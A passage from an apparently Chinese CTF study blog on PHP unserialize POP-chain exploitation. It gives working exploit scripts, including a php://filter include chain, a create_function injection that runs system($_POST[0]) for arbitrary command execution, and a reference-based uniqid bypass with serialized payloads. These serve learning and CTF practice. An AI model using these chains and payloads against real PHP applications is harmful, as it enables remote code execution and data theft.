start="4"><li>private的赋值直接在内部，在外面可能赋值不成功</li></ol><p>构建exp的顺序是从结尾往起始写的，逆向思维，就是我达成这个目的需要什么事情作为前提就是思考的过程，所以最终<a href="https://so.csdn.net/so/search?q=serialize&spm=1001.2101.3001.7020">serialize</a>的是exp的最后值</p><p>解题过程：</p><ol><li><p>首先需要找到最后的危险函数，看到了在Vox里面的include。</p></li><li><p>然后想要使用include就要调用fun这个函数</p></li><li><p>想要调用fun就要触发__invoke这个魔术方法</p></li><li><p>作为函数就是添加了一个小括号去触发，发现在Petal类中__get方法具备这个调用函数的功能，所以需要去触发__get这个方法</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__invoke</span>()          <span class="hljs-comment">//当脚本尝试将对象调用为函数时触发</span><br><span class="hljs-title function_ invoke__">__get</span>()     <span class="hljs-comment">//用于从不可访问的属性读取数据   包括属性不可访问和不存在</span><br></code></pre></td></tr></table></figure><ol start="5"><li>因为与访问相关，所以全局搜索-&gt;去找哪里会访问，可以发现在Saw类中的__toString中有一个利用数组特性去访问fearless的过程，这个fearless属于上面的get方法中不存在的属性，为不可访问属性，会触发__get,所以需要去触发__toString这个魔术方法</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__toString</span>()     <span class="hljs-comment">//把类当作字符串使用时触发</span><br></code></pre></td></tr></table></figure><ol start="6"><li>这就需要去利用正则表达式，视为字符串的特性去触发这个toString方法，而正则表达式在wakeup魔术方法里面</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__wakeup</span>()     <span class="hljs-comment">//使用unserialize时触发</span><br></code></pre></td></tr></table></figure><ol start="7"><li>所以直接在反序列化的时候就会触发这个wakeup魔术方法，到此整个pop链的逻辑全部理清</li></ol><h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a><strong>exp：</strong></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vox</span>;<br><span class="hljs-comment">//headset的赋值在内部直接赋值为php://filter/convert.base64-encode/resource=flag.php</span><br><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Petal</span>;<br><span class="hljs-variable">$p</span> -&gt; seed = <span class="hljs-variable">$v</span>;   <span class="hljs-comment">//把$v这个对象作为函数  触发这个对象的invoke方法</span><br><br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Saw</span>;<br><span class="hljs-variable">$s</span> -&gt; gun = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gun&quot;</span> =&gt; <span class="hljs-variable">$p</span>);    <span class="hljs-comment">//让$p这个对象去访问fearless 不存在触发这个对象中的get方法</span><br><span class="hljs-variable">$s2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Saw</span>;<br><span class="hljs-variable">$s2</span> -&gt; fearless = <span class="hljs-variable">$s</span>;       <span class="hljs-comment">//把$s这个对象作为字符串 触发这个对象中的toString方法</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s2</span>));   <span class="hljs-comment">//输出最终结果</span><br></code></pre></td></tr></table></figure><h5 id="自己写的exp："><a href="#自己写的exp：" class="headerlink" title="自己写的exp："></a>自己写的exp：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php">index3.php You are in my range!<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vox</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$headset</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$sound</span>;<br>    <span class="hljs-comment">//考虑fun函数作为最终的利用点</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params"><span class="hljs-variable">$pulse</span></span>)</span>&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-variable">$pulse</span>);<br>        &#125;<br>    <span class="hljs-comment">//调用invoke魔术方法  对象作为函数时触发 找用小括号的地方</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-comment">//这里可以调用fun函数</span><br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fun</span>(<span class="hljs-variable">$this</span>-&gt;headset);<br>        &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Saw</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$fearless</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$gun</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;fearless = <span class="hljs-variable">$file</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;fearless . <span class="hljs-string">&#x27; You are in my range!&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br>       <span class="hljs-comment">//对象视为字符串触发 定位到正则匹配</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-comment">//把gun设置为Petal的对象访问fearless 属于不存在属性</span><br>                <span class="hljs-variable language_">$this</span>-&gt;gun[<span class="hljs-string">&#x27;gun&#x27;</span>]-&gt;fearless;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Saw&quot;</span>;<br>        &#125;<br><span class="hljs-comment">//只是一个普通的方法 因为只有一个下划线  发现根本调用不了直接排除就好了</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_pain</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;fearless)&#123;<br>                        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;fearless);<br>                &#125;<br>        &#125;<br>       <span class="hljs-comment">//wakeup使用unserialize的时候自动触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>               <span class="hljs-comment">//正则匹配 把对象视为字符串 触发其toString方法</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|php|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;fearless))&#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Does it hurt? That&#x27;s right&quot;</span>;<br>                        <span class="hljs-variable language_">$this</span>-&gt;fearless = <span class="hljs-string">&quot;index3.php&quot;</span>;<br>                &#125;<br>        &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Petal</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$seed</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;seed = <span class="hljs-keyword">array</span>();<br>        &#125;<br>        <span class="hljs-comment">//寻找不可访问的属性 寻找箭头</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$sun</span></span>)</span>&#123;<br>                <br>            <span class="hljs-variable">$Nourishment</span> = <span class="hljs-variable language_">$this</span>-&gt;seed;<br>            <span class="hljs-comment">//函数的调用后面有括号  可以把类的对象作为函数调用 触发invoke </span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$Nourishment</span>();<br>        &#125;<br>&#125;<br><br><span class="hljs-comment">// if(isset($_GET[&#x27;ozo&#x27;]))&#123;</span><br><span class="hljs-comment">//         unserialize($_GET[&#x27;ozo&#x27;]);   //只有反序列化一定是自动触发的过程</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// else&#123;</span><br><span class="hljs-comment">//         $Saw = new Saw(&#x27;index3.php&#x27;);</span><br><span class="hljs-comment">//         $Saw-&gt;_pain();</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Saw</span>();<br><br><span class="hljs-variable">$a2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Saw</span>();<br><br><span class="hljs-variable">$a</span> -&gt; fearless = <span class="hljs-variable">$a2</span>;<br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Petal</span>;<br><span class="hljs-variable">$a2</span> -&gt; gun = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gun&quot;</span> =&gt; <span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vox</span>;<br><span class="hljs-variable">$b</span> -&gt; seed = <span class="hljs-variable">$c</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输入后成功得到一段base64密文</p><p><img src="/.com//17476562901048388660158913969350-20250519200450-p2hilyc.png" alt="17476562901048388660158913969350"></p><p>解密成功得到flag！</p><p>‍</p><h2 id="例题3："><a href="#例题3：" class="headerlink" title="例题3："></a>例题3：</h2><p><a href="http://122.114.252.87:1110/gwb.php">http://122.114.252.87:1110/gwb.php</a></p><h6 id="数组特性"><a href="#数组特性" class="headerlink" title="数组特性"></a>数组特性</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;i am f() from class A&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$arr</span> = [<span class="hljs-keyword">new</span> A, <span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$arr</span>();<br></code></pre></td></tr></table></figure><p>运行结果：<strong>i am f() from class A</strong></p><p>表明当一个数组被当做函数触发时，数组第一个元素是对象，第二个元素是方法的名字（字符串），那么就会调用该对象下的该方法。即可以调用任意对象的任意方法</p><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$pwd</span>=<span class="hljs-title function_ invoke__">getcwd</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-comment">//起始位置</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;        <br>            <span class="hljs-comment">//后面有括号 函数调用 考虑使用数组的特性</span><br>                <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;key)();<br>                <span class="hljs-variable language_">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;welcome &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;mod1;<br>                  <br>        &#125; <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-variable">$action</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-comment">//利用这段代码进行creat_function方法的调用</span><br>            <span class="hljs-variable">$a</span>=<span class="hljs-variable language_">$this</span>-&gt;action;<br>            <span class="hljs-variable">$a</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable language_">$this</span>-&gt;code);<br>        &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$pwd</span>=<span class="hljs-title function_ invoke__">getcwd</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;        <br>                <span class="hljs-comment">// unserialize($this-&gt;key)();</span><br>                <span class="hljs-comment">// $this-&gt;mod2 = &quot;welcome &quot;.$this-&gt;mod1;</span><br>                  <br>        &#125; <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;        <br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;return(0);&#125;echo(123);system($_POST[0]);//&#x27;</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;create_function&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-comment">// $a=$this-&gt;action;</span><br>            <span class="hljs-comment">// $a(&#x27;&#x27;, $this-&gt;code);</span><br>            <span class="hljs-comment">//相当于创建了一个名为a的函数 无参 函数内容如下</span><br>            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">echo</span>(<span class="hljs-number">123</span>);<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<span class="hljs-comment">//&#125;</span><br>            <span class="hljs-comment">//提前把函数a进行闭合 然后后面多余的括号注释掉</span><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">func</span>();<br><span class="hljs-variable">$arr</span> = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>, <span class="hljs-string">&#x27;get_flag&#x27;</span>];<br><span class="hljs-variable">$a</span> -&gt; key = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-comment">// unserialize($_GET[0]);</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>传上去之后当我们看到echo的123证明成功执行了这个create_function函数 然后通过system危险函数只需要post参数值就可以进行任意命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0</span>=cat \flag.php<br></code></pre></td></tr></table></figure><p><img src="/.com//17476563861268689087422098348706-20250519200627-pcvbx9z.png" alt="17476563861268689087422098348706"></p><p>成功获取flag 查看一下源代码即可</p><p><img src="/.com//17476564501344612018797667358221-20250519200730-fs681v3.png" alt="17476564501344612018797667358221"></p><p>‍</p><h1 id="指针问题："><a href="#指针问题：" class="headerlink" title="指针问题："></a>指针问题：</h1><p>对于一些系统中生成的随机值进行绕过的方法 用C语言中的取地址符&amp;进行指针引用，在序列化的时候类型为R</p><h2 id="例题1：BUU-CODE-REVIEW-1-BUUOJ"><a href="#例题1：BUU-CODE-REVIEW-1-BUUOJ" class="headerlink" title="例题1：BUU CODE REVIEW 1 BUUOJ"></a>例题1：BUU CODE REVIEW 1 BUUOJ</h2><h5 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Created by PhpStorm.</span><br><span class="hljs-comment"> * User: jinzhao</span><br><span class="hljs-comment"> * Date: 2019/10/6</span><br><span class="hljs-comment"> * Time: 8:04 PM</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;correct = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">uniqid</span>());<br>           <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;correct === <span class="hljs-variable language_">$this</span>-&gt;input) &#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>       &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pleaseget&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pleasepost&#x27;</span>] === <span class="hljs-string">&#x27;2&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &#123;<br>            <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;obj&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>传入时存在一个弱类型的比较 用数组即可绕过</p><p>在BUU类中存在一个uniqid()函数 以微秒级生成标识 每时每刻都在改变，所以我们没办法确定input的值传入 而是通过指针的方法调用correct的值进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-comment">//    public function __destruct() &#123;</span><br><span class="hljs-comment">//        try &#123;</span><br><span class="hljs-comment">//            $this-&gt;correct = base64_encode(uniqid());</span><br><span class="hljs-comment">//            if($this-&gt;correct === $this-&gt;input) &#123;</span><br><span class="hljs-comment">//                echo file_get_contents(&quot;/flag&quot;);</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//        &#125; catch (Exception $e) &#123;</span><br><span class="hljs-comment">//        &#125;</span><br><span class="hljs-comment">//    &#125;</span><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> BUU;<br><span class="hljs-variable">$a</span> -&gt; input = &amp;<span class="hljs-variable">$a</span> -&gt; correct;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>生成payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;BUU&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;correct&quot;</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;input&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/.com//17476565097171150640440786115888-20250519200830-rrjxtqt.png" alt="17476565097171150640440786115888"></p><h2 id="例题2：2020蓝帽杯"><a href="#例题2：2020蓝帽杯" class="headerlink" title="例题2：2020蓝帽杯"></a>例题2：2020蓝帽杯</h2><h5 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 